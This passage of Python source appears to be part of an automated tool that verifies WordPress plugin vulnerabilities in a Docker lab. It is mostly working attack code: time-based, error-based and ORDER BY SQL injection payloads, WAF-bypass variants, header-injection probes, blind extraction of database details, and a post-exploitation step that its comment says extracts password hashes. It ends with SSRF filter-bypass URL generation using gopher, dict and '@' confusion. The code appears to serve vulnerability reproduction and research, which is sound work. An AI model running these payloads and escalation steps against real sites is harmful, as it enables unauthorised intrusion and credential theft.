                        # (var_dump / error PHP que aparece antes del HTML normal) — un solo par
                        # es suficiente evidencia cuando la señal es clara.
                        if _tok_diff_count >= 10 or _head_differs:
                            _content_consistent = max(_content_consistent, 2)
                except Exception:
                    pass
                if _content_consistent >= 2:
                    break

            if _content_consistent >= 2:
                res.verified = True
                res.ok = True
                res.confidence = "probable"
                res.evidence["tecnica"] = "boolean-blind-content-diff"
                res.evidence["content_diff_trigger"] = _content_trigger_pair
                res.detail = (f"SQLI probable (boolean-blind, content-diff): {_content_consistent}/"
                              f"{len(bool_tried)} pares TRUE/FALSE mostraron tokens exclusivos en "
                              f"una respuesta frente a la otra -- la respuesta cambia segun la "
                              f"condicion SQL, aunque el tamaño sea similar (pagina grande con "
                              f"pequeño fragmento variable)")
                step(f"VERIFICADO (boolean-blind content-diff): {_content_consistent} pares "
                     f"con tokens exclusivos TRUE≠FALSE")
                _cdiff_true_p = (_content_trigger_pair or {}).get("true", pairs[0][0]) if bool_tried else pairs[0][0]
                _poc_params = dict(base_params); _poc_params[sqli_param] = _cdiff_true_p
                res.exploit_poc = _build_exploit_poc(
                    base_url=boot.base_url, endpoint=endpoint, method=m,
                    params=_poc_params, json_body=json_body, technique="boolean-blind SQLi (content-diff)",
                    description=f"Boolean-blind SQLi on '{sqli_param}': response body differs by exclusive tokens between TRUE/FALSE conditions. Replace TARGET with the real host.")
                res.evidence["screenshots"] = boot.shots
                res.evidence["http_captures"] = boot.http_captures
                return res

        # ultimo recurso: time-based blind. Si el contenido/longitud de la respuesta nunca cambia
        # (p.ej. la pagina siempre devuelve lo mismo independientemente del resultado del query),
        # SLEEP(5) vs SLEEP(0) en la misma condicion mide un retraso real en vez de comparar texto.
        _bool_max_diff = max((abs(len(r.text or "") - len(s.text or "")) if isinstance(r, object) and hasattr(r, "text") and isinstance(s, object) and hasattr(s, "text") else 0
                              for r, s in [(None, None)]), default=0)
        step(f"[técnica boolean-blind] FALLO: {consistent_diffs}/{len(pairs)} pares con "
             f"diferencia de longitud (umbral: 2), "
             f"{getattr(locals().get('_content_consistent', None), '__class__', type(0)).__name__}="
             f"{locals().get('_content_consistent', 0)} pares content-diff — señal insuficiente")
        res.failure_trace.append({
            "attempt_n": 3, "technique": "boolean-blind", "endpoint": endpoint,
            "param": sqli_param, "causa": "señal_insuficiente",
            "detail": (f"consistent_diffs={consistent_diffs}/{len(pairs)}, "
                       f"content_diffs={locals().get('_content_consistent', 0)}/{len(pairs)}"),
            "diff_bytes": 0,
        })
        step("boolean-blind no mostro diferencia; probando time-based blind (SLEEP/pg_sleep/"
             "WAITFOR)...")
        # MySQL SLEEP() en varios contextos, mas pg_sleep() (PostgreSQL) y WAITFOR DELAY (MSSQL,
        # via query apilada con ';' -- motor distinto, sintaxis distinta, se prueban los tres en
        # vez de asumir MySQL) -- casuistica real de SQL Injection/Intruder/Generic_TimeBased.txt
        # en PayloadsAllTheThings.
        _rq2 = "%27" if sqli_via_rawurldecode else "'"
        timing_pairs = [
            (f"{orig_value}{_rq2} AND SLEEP(5)-- -", f"{orig_value}{_rq2} AND SLEEP(0)-- -"),
            (f"{orig_value} AND SLEEP(5)-- -", f"{orig_value} AND SLEEP(0)-- -"),
            (f"{orig_value}{_rq2} OR SLEEP(5)-- -", f"{orig_value}{_rq2} OR SLEEP(0)-- -"),
            # Small-SLEEP OR variant: fires for every table row (N×SLEEP), so SLEEP(5) can
            # easily exceed the 20s request timeout when the table has many rows (e.g. postmeta
            # with 20-30 WP core rows). SLEEP(0.3) keeps the total at ~6-9s even with 30 rows,
            # well within timeout and above the 3.5s detection threshold.
            (f"{orig_value}{_rq2} OR SLEEP(0.3)-- -", f"{orig_value}{_rq2} OR SLEEP(0)-- -"),
            (f"{orig_value}' AND pg_sleep(5)-- -", f"{orig_value}' AND pg_sleep(0)-- -"),
            (f"{orig_value} AND pg_sleep(5)-- -", f"{orig_value} AND pg_sleep(0)-- -"),
            (f"{orig_value}';WAITFOR DELAY '0:0:5'--", f"{orig_value}';WAITFOR DELAY '0:0:0'--"),
            (f"{orig_value});WAITFOR DELAY '0:0:5'--", f"{orig_value});WAITFOR DELAY '0:0:0'--"),
            # BETWEEN-context: avoids '--' that breaks unclosed string literals inside SQL functions.
            # Uses orig_value (not hardcoded '1') so the date is valid and MySQL evaluates the
            # WHERE clause instead of short-circuiting on an invalid date bound.
            # Works in: BETWEEN '$from X' AND '$to Y', DATE('$from'), and standard WHERE '$col'.
            (f"{orig_value}' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1", f"{orig_value}' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a) AND '1"),
            # IN()-numeric context: no trailing comment because '--' would comment out the closing ')'.
            # Works in: WHERE col IN ($value) when value is used without quotes.
            (f"{orig_value} AND SLEEP(5)", f"{orig_value} AND SLEEP(0)"),
            (f"{orig_value} AND (SELECT IF(1=1,SLEEP(5),0))", f"{orig_value} AND (SELECT IF(1=2,SLEEP(5),0))"),
            # WAF bypass: BENCHMARK instead of SLEEP (some WAFs block "SLEEP" keyword)
            (f"{orig_value}{_rq2} AND BENCHMARK(5000000,MD5(1))-- -",
             f"{orig_value}{_rq2} AND BENCHMARK(1,MD5(1))-- -"),
            # WAF bypass: inline comment splits SLEEP keyword
            (f"{orig_value}{_rq2} AND SL/**/EEP(5)-- -",
             f"{orig_value}{_rq2} AND SL/**/EEP(0)-- -"),
            # WAF bypass: hex-encoded space + comment between AND and SLEEP
            (f"{orig_value}{_rq2}%09AND%09SLEEP(5)-- -",
             f"{orig_value}{_rq2}%09AND%09SLEEP(0)-- -"),
        ]
        timing_tried = []
        timing_consistent = 0
        for slow_p, fast_p in timing_pairs:
            try:
                t0_f = time.time()
                send(fast_p)
                fast_s = time.time() - t0_f
                t0_sl = time.time()
                send(slow_p)
                slow_s = time.time() - t0_sl
            except Exception as e:
                timing_tried.append({"slow": slow_p, "fast": fast_p, "error": str(e)})
                continue
            delayed = (slow_s - fast_s) >= 3.5
            timing_tried.append({"slow": slow_p, "fast": fast_p, "slow_s": round(slow_s, 2),
                                 "fast_s": round(fast_s, 2), "retraso_consistente": delayed})
            if delayed:
                timing_consistent += 1
        res.evidence["timing_intentos"] = timing_tried
        # Diagnostic: if all slow payloads resolved much faster than SLEEP would take,
        # SLEEP is not executing at all — likely because the SQL query uses INNER JOINs
        # over empty tables (no plugin fixture data in the lab) so the WHERE clause is
        # never evaluated.  Add a targeted hint so the analyst knows exactly why.
        _slow_times = [t.get("slow_s", 0) for t in timing_tried if "slow_s" in t]
        if _slow_times and max(_slow_times) < 2.0 and timing_consistent == 0:
            res.limitations.append(
                "time-based: todos los payloads SLEEP(5) respondieron en < 2s -- SLEEP "
                "probablemente no se evalua; causa tipica: la consulta SQL usa INNER JOINs "
                "sobre tablas de contenido del plugin (posts, term_relationships) que estan "
                "vacias en el lab sin datos de prueba. Considera: (a) crear contenido del "
                "plugin via wp-cli antes del ataque, o (b) usar --setup-wp-option para "
                "activar una ruta de codigo que consulte una tabla siempre poblada "
                "(p.ej. wp_term_taxonomy)."
            )

        # Threshold principal: 2+ pares con retraso >= 3.5s
        # Threshold alternativo: 1 par con retraso >= 8s — cuando la tabla tiene
        # pocas filas solo el payload OR SLEEP dispara (AND SLEEP no evalúa si no
        # hay filas que coincidan con la condición), así que un retraso muy grande
        # en 1 par es igual de convincente que 2 pares con retraso justo.
        _max_single_delay = max(
            (t.get("slow_s", 0) - t.get("fast_s", 0)
             for t in timing_tried if "slow_s" in t and "fast_s" in t),
            default=0.0,
        )
        if timing_consistent >= 2 or (timing_consistent >= 1 and _max_single_delay >= 8.0):
            res.verified = True
            res.ok = True
            res.confidence = "probable"
            res.evidence["tecnica"] = "time-based-blind"
            res.detail = (f"SQLI probable (time-based blind): {timing_consistent}/"
                          f"{len(timing_pairs)} pares SLEEP(5)/SLEEP(0) mostraron un retraso "
                          f"consistente de al menos ~3.5s -- indicio de inyeccion ciega sin "
                          f"ninguna diferencia visible en el contenido de la respuesta")
            step(f"VERIFICADO (time-based blind): {timing_consistent}/{len(timing_pairs)} pares "
                 f"mostraron retraso consistente")
            _tbwin = next((t["slow"] for t in timing_tried if t.get("retraso_consistente")), timing_pairs[0][0])
            _tbfast = next((t["fast"] for t in timing_tried if t.get("retraso_consistente")), None)
            _tbslow_s = next((t.get("slow_s", 0) for t in timing_tried if t.get("retraso_consistente")), 0)
            _tbfast_s = next((t.get("fast_s", 0) for t in timing_tried if t.get("retraso_consistente")), 0)
            _poc_params = dict(base_params); _poc_params[sqli_param] = _tbwin
            res.exploit_poc = _build_exploit_poc(
                base_url=boot.base_url, endpoint=endpoint, method=m,
                params=_poc_params, json_body=json_body, technique="time-based blind SQLi",
                description=f"Time-based blind SQLi on '{sqli_param}': SLEEP(5) causes ≥3.5s delay vs SLEEP(0). Replace TARGET with the real host and add auth cookie if needed.")
            # Screenshot terminal con evidencia timing
            _capture_terminal_shot(
                boot, "binoracle · Time-based Blind SQLi — timing evidence",
                content=(f"[TIME-BASED BLIND SQLi CONFIRMED]\n"
                         f"Parameter: {sqli_param}\n"
                         f"SLOW payload (SLEEP): {_tbwin!r}\n"
                         f"  → elapsed: {_tbslow_s:.2f}s\n"
                         f"FAST payload (SLEEP(0)): {_tbfast!r}\n"
                         f"  → elapsed: {_tbfast_s:.2f}s\n"
                         f"Pairs consistent: {timing_consistent}/{len(timing_pairs)}\n\n"
                         f"The SLEEP() function in the payload caused measurable server-side\n"
                         f"delay, confirming SQL code execution (time-based blind injection)."),
                highlight="CONFIRMED",
                caption_es=(f"Paso 5 (CLAVE): SQLi TIME-BASED BLIND CONFIRMADA — retraso "
                            f"{_tbslow_s:.1f}s (SLEEP) vs {_tbfast_s:.1f}s (control) en "
                            f"{timing_consistent}/{len(timing_pairs)} pares. Param: {sqli_param}"),
                caption_en=(f"Step 5 (KEY): TIME-BASED BLIND SQLi CONFIRMED — {_tbslow_s:.1f}s delay "
                            f"(SLEEP) vs {_tbfast_s:.1f}s (control) in {timing_consistent}/{len(timing_pairs)} pairs."),
                url=boot.base_url + endpoint)
            # --- Post-confirmation extraction via conditional SLEEP ---
            try:
                def _tb_request_fn(payload_v: str):
                    import time as _t2
                    _t2_start = _t2.monotonic()
                    send(payload_v)
                    return (_t2.monotonic() - _t2_start, 0)
                _blind_data = _blind_time_extract(
                    request_fn=_tb_request_fn,
                    base_payload=_tbwin,
                    sleep_val=5.0,
                    sleep_threshold=3.5,
                    budget_requests=25,
                )
                res.evidence["blind_extraction"] = _blind_data
                step(f"blind extraction: version≈{_blind_data.get('db_version_prefix')!r}, "
                     f"user≈{_blind_data.get('db_user_prefix')!r}, "
                     f"db≈{_blind_data.get('db_name_prefix')!r} "
                     f"({_blind_data.get('requests_used', 0)} requests)")
            except Exception:
                pass
        else:
            _max_single_delay_local = max(_slow_times) if _slow_times else 0.0
            step(f"[técnica time-based blind] FALLO: {timing_consistent}/{len(timing_pairs)} "
                 f"pares con delay >=3.5s (umbral: 2 pares o 1 par >=8s), "
                 f"max_delay={_max_single_delay_local:.1f}s")
            res.failure_trace.append({
                "attempt_n": 4, "technique": "time-based blind", "endpoint": endpoint,
                "param": sqli_param, "causa": "delay_insuficiente",
                "detail": (f"timing_consistent={timing_consistent}/{len(timing_pairs)}, "
                           f"max_delay={_max_single_delay_local:.1f}s"),
                "diff_bytes": 0,
            })
            # ultimo recurso (5): contexto ORDER BY. Todo lo anterior asume una clausula WHERE
            # -- el payload es '<valor original><cierre> AND/OR <condicion>', apoyado en que el
            # valor original SIGUE siendo parte de una comparacion real. Un sumidero que mete el
            # parametro DIRECTAMENTE en un ORDER BY (p.ej. WP_User_Query 'orderby' sin whitelist
            # -- confirmado en vivo contra CVE-2024-1071, Ultimate Member, parametro 'sorting':
            # sorting_query() hace literalmente `$this->query_args['orderby'] = $sortby;` con el
            # valor del POST sin pasar por ningun escape) nunca puede confirmarse con esos
            # payloads: no hay ninguna clausula WHERE a la que concatenar un AND/OR, y una
            # comilla simplemente rompe la sintaxis de una columna/expresion de ORDER BY en vez
            # de cerrar una cadena -- el motor devuelve un error de sintaxis ajeno a la
            # inyeccion, no una diferencia explotable. Aqui el valor INYECTADO ES la expresion
            # COMPLETA (sin AND/OR, sin comillas, sin comentario): una subconsulta escalar es
            # sintacticamente valida como columna de ORDER BY en MySQL, así que sirve igual
            # de bien para error-based (su resultado se evalua igual) y para time-based. Nunca
            # es exclusivo de este plugin -- cualquier ORDER BY/columna dinamica sin whitelist
            # cae en el mismo patron.
            step("time-based blind (contexto WHERE) tampoco mostro diferencia; probando "
                 "contexto ORDER BY -- el valor inyectado es una subconsulta completa, sin "
                 "AND/OR ni comillas...")
            # prefijo ',' obligatorio: el valor inyectado se coloca DESPUES de 'created_at'
            # como segunda columna de ORDER BY (ej. ORDER BY created_at ,(SELECT...)).
            # Sin la coma, MySQL interpreta la subconsulta como un segundo token inesperado
            # tras el nombre de columna y lanza un error de SINTAXIS (no el error XPATH que
            # buscamos). Con la coma, la subconsulta es una expresion valida en el ORDER BY y
            # se evalua aunque la tabla este vacia -- el error XPATH se genera en tiempo de
            # evaluacion de la expresion, antes de que haya filas que ordenar.
            # Two formats: (a) append-style for injections that go into 'ORDER BY existing_col,{val}'
            # (b) replace-style for injections where the WHOLE value becomes 'ORDER BY u.{val}'
            # e.g. UM CVE-2024-1071: ORDER BY u.$sortby — 'u.,$injection' is invalid MySQL;
            # 'u.user_login,$injection' is valid (second item in ORDER BY list).
            # Derivar el prefijo de columna desde orig_value cuando sea un nombre de columna
            # real (p.ej. mailplus: orig_value="sent_time" → prefijo "sent_time,").
            _orderby_col_prefix_candidate = orig_value.strip() if orig_value else ""
            if (_orderby_col_prefix_candidate
                    and re.match(r'^[\w.]+$', _orderby_col_prefix_candidate)
                    and len(_orderby_col_prefix_candidate) < 40):
                _orderby_col_prefix = _orderby_col_prefix_candidate + ","
            else:
                _orderby_col_prefix = "user_login,"
            orderby_error_payloads = [
                f"{_orderby_col_prefix}(SELECT extractvalue(1,concat(0x7e,version())))",
                f"{_orderby_col_prefix}(SELECT updatexml(1,concat(0x7e,version()),1))",
                ",(SELECT extractvalue(1,concat(0x7e,version())))",
                ",(SELECT updatexml(1,concat(0x7e,version()),1))",
                # Pure-subquery style: MySQL cannot use an index scan when the entire ORDER BY
                # is a subquery expression (no column reference), so the expression IS evaluated
                # even on a table with an indexed 'sent_time' column where the col-prefix style
                # above is silently skipped by the MySQL optimizer.  Critical for tables where
                # the PoC appends to an indexed column (e.g. wp-mailplus-logs: sent_time index).
                "(SELECT extractvalue(1,concat(0x7e,version())))",
                "(SELECT updatexml(1,concat(0x7e,version()),1))",
            ]
            orderby_error_tried = []
            orderby_error_found = None
            for payload_val in orderby_error_payloads:
                try:
                    r = send(payload_val)
                except Exception as e:
                    orderby_error_tried.append({"payload": payload_val, "error": str(e)})
                    continue
                new_versions = (
                    {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")
                     if _is_plausible_mysql_ver(v)} - version_noise)
                _body_snip = (r.text or "").replace("\n", " ")
                # Capture a larger slice (1000 chars) to ensure MySQL XPATH error is not
                # cut off by a long PHP deprecation warning that can exceed 300 chars.
                orderby_error_tried.append({
                    "payload": payload_val, "status": r.status_code,
                    "version_nueva": sorted(new_versions),
                    "respuesta_cuerpo_recorte": _body_snip[:1000]})
                if not new_versions:
                    # Debug: log response snippet so we can see if the MySQL error IS there
                    # but not matching, or if it's absent entirely.
                    _snip = _body_snip[200:600]  # skip the PHP deprecation preamble
                    step(f"[debug] ORDER BY error payload #{orderby_error_payloads.index(payload_val)+1} "
                         f"status={r.status_code} bytes={len(r.text or '')} "
                         f"body[200:600]={_snip[:200]}")
                if new_versions:
                    orderby_error_found = (payload_val, sorted(new_versions)[0])
                    break
            res.evidence["orderby_error_intentos"] = orderby_error_tried

            orderby_timing_consistent = 0
            orderby_timing_tried: List[dict] = []
            if orderby_error_found:
                payload_val, mysql_version = orderby_error_found
                res.verified = True
                res.ok = True
                res.confidence = "confirmed"
                res.evidence["tecnica"] = "order-by-context-error-based"
                res.evidence["mysql_version_extraida"] = mysql_version
                res.evidence["payload_ganador"] = payload_val
                res.detail = (f"SQLI VERIFICADA (error-based, contexto ORDER BY): la version "
                              f"real de MySQL ({mysql_version}) aparecio en el mensaje de error "
                              f"XPATH al mandar el parametro como una subconsulta escalar "
                              f"DIRECTA (sin AND/OR ni comillas) -- confirma que el sumidero "
                              f"mete el valor en una clausula ORDER BY, no WHERE")
                step(f"VERIFICADO (error-based, contexto ORDER BY): version real de MySQL "
                     f"({mysql_version}) extraida del mensaje de error")
            else:
                # time-based CONDICIONAL (CASE WHEN) en el mismo contexto -- mas riguroso que un
                # SLEEP incondicional: demuestra que una CONDICION real controla el retraso, no
                # solo que 'SLEEP' sea aceptado ahi por casualidad (p.ej. si el motor evalua la
                # subconsulta una vez por fila a ordenar, un SLEEP incondicional escalaria con
                # el numero de filas y daria un retraso real que no prueba nada sobre si HAY
                # inyeccion -- el par condicional (1=1 vs 1=2, mismo SLEEP) aisla justamente eso.
                step("error-based en contexto ORDER BY no filtro nada; probando time-based "
                     "CONDICIONAL (CASE WHEN) en el mismo contexto...")
                # mismo prefijo ',' que en error_payloads -- sin el la sintaxis es invalida.
                # El par condicional (1=1 vs 1=2) demuestra que es la condicion, no el contexto,
                # la que controla el retraso. El par incondicional (SLEEP(5) vs SLEEP(0)) sirve
                # de ultimo recurso si la subconsulta CASE se evalua en contexto de fila vacia.
                orderby_timing_pairs = [
                    # replace-style: for ORDER BY u.{val} — 'u.user_login,subquery' is valid MySQL
                    (f"{_orderby_col_prefix}(SELECT IF(1=1,SLEEP(5),0))",
                     f"{_orderby_col_prefix}(SELECT IF(1=2,SLEEP(5),0))"),
                    (f"{_orderby_col_prefix}(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)",
                     f"{_orderby_col_prefix}(SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END)"),
                    # append-style: for ORDER BY existing_col,{val}
                    (",(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)",
                     ",(SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END)"),
                    (",(SELECT SLEEP(5))", ",(SELECT SLEEP(0))"),
                    # Pure-subquery style: ORDER BY (SELECT SLEEP(5)) — no column prefix so MySQL
                    # cannot use an index scan on the existing column and MUST evaluate the
                    # expression.  Needed when the prefix column (e.g. sent_time) has an index
                    # and MySQL's optimizer would otherwise skip the second ORDER BY item.
                    ("(SELECT IF(1=1,SLEEP(5),0))", "(SELECT IF(1=2,SLEEP(5),0))"),
                    ("(SELECT SLEEP(5))", "(SELECT SLEEP(0))"),
                ]
                for slow_p, fast_p in orderby_timing_pairs:
                    try:
                        t0_f = time.time()
                        send(fast_p)
                        fast_s = time.time() - t0_f
                        t0_sl = time.time()
                        send(slow_p)
                        slow_s = time.time() - t0_sl
                    except Exception as e:
                        orderby_timing_tried.append({"slow": slow_p, "fast": fast_p,
                                                     "error": str(e)})
                        continue
                    delayed = (slow_s - fast_s) >= 3.5
                    orderby_timing_tried.append({
                        "slow": slow_p, "fast": fast_p, "slow_s": round(slow_s, 2),
                        "fast_s": round(fast_s, 2), "retraso_consistente": delayed})
                    if delayed:
                        orderby_timing_consistent += 1
                res.evidence["orderby_timing_intentos"] = orderby_timing_tried
                if orderby_timing_consistent >= 1:
                    res.verified = True
                    res.ok = True
                    res.confidence = "probable"
                    res.evidence["tecnica"] = "order-by-context-time-based"
                    res.detail = (f"SQLI VERIFICADA (time-based, contexto ORDER BY): "
                                  f"{orderby_timing_consistent}/{len(orderby_timing_pairs)} "
                                  f"subconsultas escalares (sin AND/OR ni comillas) mostraron "
                                  f"un retraso consistente de al menos ~3.5s -- confirma que el "
                                  f"sumidero mete el valor directamente en una clausula ORDER BY")
                    step(f"VERIFICADO (time-based, contexto ORDER BY): "
                         f"{orderby_timing_consistent}/{len(orderby_timing_pairs)} subconsultas "
                         f"mostraron retraso consistente")
            if not res.verified:
                res.ok = True
                # el cuerpo real de la peticion de CONTROL (la mas simple de todas) es la pista
                # mas util para diagnosticar un negativo sin relanzar el ataque a mano: un error
                # fatal de PHP, un redirect inesperado, o un cuerpo vacio apuntan a algo del
                # servidor/la ruta del ataque, no a que el payload sea el equivocado.
                control_sample = res.evidence.get("respuesta_control_recorte") or ""
                step(f"[técnica ORDER BY] FALLO: {orderby_timing_consistent}/"
                     f"{len(orderby_timing_tried) or 1} subconsultas con delay — "
                     f"ninguna técnica SQLi confirmó la vulnerabilidad en este lab")
                res.failure_trace.append({
                    "attempt_n": 5, "technique": "ORDER BY", "endpoint": endpoint,
                    "param": sqli_param, "causa": "sin_señal",
                    "detail": (f"orderby_timing={orderby_timing_consistent}/"
                                f"{len(orderby_timing_tried) or 1}; "
                                f"5 técnicas agotadas sin confirmación"),
                    "diff_bytes": 0,
                })
                res.detail = (
                    f"error-based ({len(error_tried)}) y UNION-based ({len(union_tried)}) no "
                    f"filtraron version(), boolean-blind no mostro diferencia consistente "
                    f"({consistent_diffs}/{len(pairs)}), time-based blind (contexto WHERE) "
                    f"tampoco ({timing_consistent}/{len(timing_pairs)}), y ni error-based ni "
                    f"time-based condicional en contexto ORDER BY (subconsulta directa, sin "
                    f"AND/OR ni comillas; {orderby_timing_consistent}/"
                    f"{len(orderby_timing_tried) or 1}) mostraron ninguna senal -- la inyeccion "
                    f"SQL no se confirmo" +
                    (f". Respuesta real de la peticion de control: {control_sample!r}"
                     if control_sample else ""))
                # Captura final: ultima respuesta obtenida, para que el informe muestre algo
                step("capturando pantalla: ultima respuesta HTTP recibida (resultado final del "
                     "intento de inyeccion)...")
                _last_resp_body = control_sample or ""
                _last_png = _screenshot_response(boot.base_url + endpoint, m,
                                                 base_resp.status_code, _last_resp_body)
                if _last_png:
                    boot.shots.append({
                        "png_b64": _last_png,
                        "caption_es": (f"Última respuesta HTTP recibida ({m} {endpoint}) — "
                                       f"ninguna de las {len(error_tried) + len(union_tried)} "
                                       f"combinaciones de inyección mostró evidencia de SQLi. "
                                       f"Esta es la respuesta base del servidor para diagnóstico."),
                        "caption_en": (f"Last HTTP response received ({m} {endpoint}) — none "
                                       f"of the {len(error_tried) + len(union_tried)} injection "
                                       f"combinations showed SQLi evidence. This is the server "
                                       f"baseline response for diagnosis."),
                        "url": boot.base_url + endpoint,
                    })
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        if not res.verified and res.confidence == "none":
            res.confidence = "inconclusive"
        # --- SQLi param rotation ---
        # If all 5 techniques failed on sqli_param, try the next candidate from parameters
        # that hasn't been tried yet. Reuses the running lab (boot/_live_boot=boot) so no
        # extra Docker startup cost. Caps at 2 additional params to avoid runaway budget.
        if (not res.verified and parameters and sqli_param
                and (_tried_params_set is None or len(_tried_params_set) < 3)):
            _already_tried = (_tried_params_set or frozenset()) | {sqli_param}
            _param_names = (list(parameters.keys()) if isinstance(parameters, dict)
                            else list(parameters))
            # collect candidates in SQLI_HINTS priority order, skip already tried
            _rotation_candidates = []
            for _h in _SQLI_HINTS:
                for _pn in _param_names:
                    if (_h in _pn.lower() and _pn not in _already_tried
                            and _pn not in _rotation_candidates):
                        _rotation_candidates.append(_pn)
            if _rotation_candidates:
                _next_p = _rotation_candidates[0]
                _remaining_budget = max(60.0, budget_s - (time.time() - t0))
                step(f"param rotation: sin diferencial en '{sqli_param}'; "
                     f"probando siguiente candidato '{_next_p}' "
                     f"(presupuesto restante: {_remaining_budget:.0f}s)...")
                _rot = verify_wordpress_sqli(
                    plugin_source_dir, slug, endpoint, m,
                    parameters, sqli_param_hint=_next_p,
                    on_step=on_step, budget_s=_remaining_budget,
                    setup_wp_options=setup_wp_options,
                    companion_plugins=companion_plugins,
                    shortcode_name=shortcode_name,
                    relationship_table=relationship_table,
                    extra_nonce_pages=extra_nonce_pages,
                    extra_setup_trigger_paths=extra_setup_trigger_paths,
                    keep_lab_on_failure=False,
                    _live_boot=boot,  # reuse running lab — no extra Docker cost
                    json_body=json_body,
                    required_role=required_role,
                    sqli_via_request_uri=sqli_via_request_uri,
                    sqli_via_rawurldecode=sqli_via_rawurldecode,
                    _tried_params_set=_already_tried,
                )
                if _rot.verified:
                    return _rot
        # --- Header injection fallback ---
        # When no query/body param produced a SQLi signal, try injecting into HTTP headers
        # (X-Forwarded-For, User-Agent, Referer…) — common pattern in log-based SQLi CVEs.
        if not res.verified and boot is not None:
            _hdr_candidates = []
            if sqli_header_hint:
                _hdr_candidates = [sqli_header_hint]
            else:
                # Only try headers if the LLM hypothesis mentions them or we exhausted params
                _hyp_text = str(parameters) + str(endpoint)
                for _hdr in _HEADER_INJECTION_HINTS:
                    if _hdr.lower().replace("-", "_") in _hyp_text.lower():
                        _hdr_candidates.append(_hdr)
            for _inject_hdr in _hdr_candidates[:3]:
                _hdr_budget = max(30.0, budget_s - (time.time() - t0))
                if _hdr_budget < 30:
                    break
                step(f"header injection fallback: probando SQLi en header '{_inject_hdr}'...")
                # Build a quick error-based probe via the header
                _hdr_payloads = [
                    "1' AND extractvalue(1,concat(0x7e,version()))-- -",
                    "1 AND extractvalue(1,concat(0x7e,version()))-- -",
                    "' OR '1'='1",
                ]
                _sess = boot.admin_sess if boot.admin_sess else boot.sub_sess
                _base_p = dict(parameters) if isinstance(parameters, dict) else {}
                for _hp in _hdr_payloads:
                    try:
                        _hr = _sess.request(
                            (http_method or "GET").upper(), boot.base_url + endpoint,
                            timeout=15,
                            params=_base_p if (http_method or "GET").upper() == "GET" else None,
                            data=_base_p if (http_method or "GET").upper() != "GET" else None,
                            headers={_inject_hdr: _hp})
                        _body = _hr.text or ""
                        if any(sig in _body for sig in ("extractvalue", "XPATH syntax error",
                                                         "mysql_num_rows", "SQL syntax",
                                                         "You have an error in your SQL")):
                            res.verified = True
                            res.ok = True
                            res.confidence = "confirmed"
                            res.evidence.update({
                                "tecnica": "error-based-header-injection",
                                "header": _inject_hdr,
                                "payload_ganador": _hp,
                                "respuesta_cuerpo_recorte": _body[:500],
                            })
                            res.detail = (f"SQLi ERROR-BASED via CABECERA HTTP confirmada: "
                                          f"header '{_inject_hdr}' = {_hp!r} produjo error SQL "
                                          f"en la respuesta")
                            step(f"VERIFICADO via header: '{_inject_hdr}' con payload {_hp!r}")
                            break
                    except Exception:
                        pass
                if res.verified:
                    break
        # Post-exploit escalation for SQLi: extract version, user(), hashes
        if res.verified and boot is not None:
            try:
                _base_pe2 = boot.base_url
                _ep_pe2 = endpoint or ""
                _param_pe2 = res.evidence.get("sqli_param") or res.evidence.get("parametro_ganador") or sqli_param or ""
                _m_pe2 = m or "GET"
                if _ep_pe2 and _param_pe2:
                    _esc2 = escalate_post_sqli(lab, _base_pe2, _ep_pe2, _param_pe2, _m_pe2, step=step)
                    if _esc2:
                        res.evidence["post_exploit_sqli"] = _esc2
                        res.evidence["escalation_level"] = _esc2.get("escalation_level", "none")
                        step(f"[post-exploit-sqli] escalacion: {_esc2.get('escalation_level','?')}")
            except Exception:
                pass
        return res
    except subprocess.TimeoutExpired as e:
        step(f"TIMEOUT en verify_wordpress_sqli: {e}")
        res.detail = f"timeout de infraestructura: {e}"
        res.confidence = "not_reproducible"
        return res
    except Exception as e:
        step(f"ERROR inesperado en verify_wordpress_sqli: {type(e).__name__}: {e}")
        res.detail = f"error inesperado: {e}"
        if res.confidence == "none":
            res.confidence = "not_reproducible"
        return res
    finally:
        # _live_boot: we borrowed the lab, caller owns teardown — don't touch it.
        # _lab_ref is not None: caller requested deferred teardown — skip for now.
        if _live_boot is None and _lab_ref is None:
            _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def _ssrf_url_variants(listener_host: str, listener_ip: str, port: int, path: str) -> list:
    """Return extra SSRF URL bypass variants beyond the standard set in build_urls().

    Covers: gopher:// for blind SSRF with response smuggling, dict://, 0.0.0.0
    shorthand, IPv6 loopback, URL credentials with '@' confusion, and encoded
    variants that some wp_remote_get wrappers pass through without normalising.
    These are appended to the main tried list; the main loop already handles
    decimal/hex/octal/IPv6-mapped.
    """
    urls = []
    base_path = path.lstrip("/")

    # gopher:// — triggers outbound TCP connection even when wp_remote_get blocks http://;
    # some plugins only check the scheme in an allowlist after fetching, not before.
    urls.append(f"gopher://{listener_host}:{ port}/_GET%20%2F{base_path}%20HTTP%2F1.0%0d%0a%0d%0a")

    # dict:// — triggers TCP connection; some older PHP builds accept it via CURLOPT_URL
    urls.append(f"dict://{listener_host}:{port}/binoracle:{base_path}")

    # 0.0.0.0 — binds to all interfaces; on some Linux kernels routes to loopback
    urls.append(f"http://0.0.0.0:{port}/{base_path}")

    # IPv6 loopback and unspecified — available inside the Docker bridge network
    urls.append(f"http://[::1]:{port}/{base_path}")
    urls.append(f"http://[::]:{port}/{base_path}")

    # Credentials confusion with '@' in host — some parsers take the host after '@'
    # as the actual destination, others take what's before ':'
    urls.append(f"http://safe.example.com@{listener_host}:{port}/{base_path}")
    if listener_ip:
        urls.append(f"http://safe.example.com@{listener_ip}:{port}/{base_path}")

    # URL fragment trick — some block-lists check up to '#'; the fetch ignores the fragment
    urls.append(f"http://{listener_host}:{port}/{base_path}#https://trusted.example.com")

    # Double slash after scheme — some URL parsers split on '://' and accept '///' as scheme-less
    urls.append(f"http:/{listener_host}:{port}/{base_path}")

    return urls


def verify_wordpress_ssrf(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, url_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
